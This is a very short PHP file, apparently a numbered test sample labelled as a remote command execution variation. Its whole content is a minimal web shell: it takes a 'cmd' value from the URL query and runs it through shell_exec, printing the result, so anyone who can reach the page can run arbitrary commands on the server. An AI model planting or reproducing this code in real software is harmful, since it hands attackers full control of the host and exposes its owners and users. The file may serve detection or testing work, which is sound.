<?php
// RCE test variation #863
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>